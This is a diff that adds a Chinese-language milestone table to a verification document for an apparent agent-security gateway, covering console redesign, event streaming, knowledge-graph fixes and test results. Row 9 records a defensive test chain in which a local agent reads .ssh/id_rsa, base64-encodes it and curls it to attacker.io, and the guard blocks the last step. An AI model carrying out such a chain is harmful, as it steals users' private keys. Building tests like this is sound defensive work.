@@ -243,3 +243,21 @@ wsl go build ./...                                          # 编译
 | M7-8 | **M6 三项作废标注** | VERIFICATION.md 显式标注 M6 中 KG/taint/自愈三项为无效取证 | `grep -n "graph_ready\|sc query" docs/VERIFICATION.md` | 本节已标注：M6 原 `graph_ready:true` / `sc query Running` 为管理面假绿，已作废；新判据均为功能面 | ✅ |
 
 > M6 报告中 `500 节点` / `三步链 BLOCK` / `五服务自愈就绪` 三项在此作废，原因：前者为 worker 内存态无持久化+健康检查假绿；中者为 hook 路径未接 `ObserveResult` 且 `Bash` 不在 sink；后者为零验证。
+
+## 6. M8 — 控制台重设计 + KG 血缘修复 (2026-08-29, 基线 1bcf3bc → 466666f)
+
+| # | 项 | 判据 | 实测 | 状态 |
+|---|---|---|---|---|
+| 1 | 信息架构 5→4 | 实时台/舰队/管控/洞察四导航 | `App.tsx` 253→90 行；四路由全可切换无白屏 | ✅ |
+| 2 | **SSE 真通** | 主动打 activity，事件 2s 内推送非轮询 | `event: activity` 含 `"tool_name":"Bash"`；`TestStreamActivityFanOut` PASS；断线指数退避重连 | ✅ |
+| 3 | 健康条真实 | 不拿浏览器跨域冒充 | `/api/status.services` 后端聚合：`gateway/behavior/kg-worker/outputguard` 全 true（cpolar 因 TTFB~1.5s>4s 探针判 false，非服务死，已注明） | ✅ |
+| 4 | **图谱风险优先** | 默认档 ≤60 节点，无 Trace | 风险档 **52/202 节点**，裁 150 低风险；**0 Trace 节点**（原 156 噪音） | ✅ |
+| 5 | **血缘追溯** | graph/path 解析出路径 | 修前 `no path found` → 修后 `agent:lv-agent → evt:hook-...` hop 1 | ✅ |
+| 6 | KG 数据建模修复 | agent 用 AgentID 非 UserID+session | `builder.go` 改判；`TestIngestUsesAgentID/FallsBackToUserID` PASS | ✅ |
+| 7 | KG 实时入图 | hook 事件即时进图谱 | `SetKGLive` 接 activity handler；不再等 30s 自愈 | ✅ |
+| 8 | 视觉 GCP/AWS | 浅色内容区+深色 navy 侧栏 | 视觉检查 5 页全过：无错位/崩坏/空屏；KPI/事件流/Agent 卡/健康条/三档切换/空态全渲染 | ✅ |
+| 9 | 安全测试端到端 | 本地 agent 三步链 | `sectest`：`Read .ssh/id_rsa → base64 → curl attacker.io` step3 BLOCK 含 taint 血缘；干净对照 CONFIRM | ✅ |
+| 10 | 静态门禁 | tsc/lint/go test | `tsc --noEmit` 0；`oxlint` 0；`go test ./...` 18 包全绿；`asg-guard 42/42` | ✅ |
+
+> 提交链：`1bcf3bc`(M7 文档) → `c4c319d`(SSE+token) → `9ed30e0`(控制台重设计) → `56c8b09`(GCP/AWS 风格) → `031875f`(健康聚合+KPI 口径) → `709346d`(KG 建模修复) → `466666f`(KG 实时入图)。
+> 新增测试：`stream_api_test.go`(SSE fan-out) · `builder_test.go`(agent 身份 + 无 Trace)。
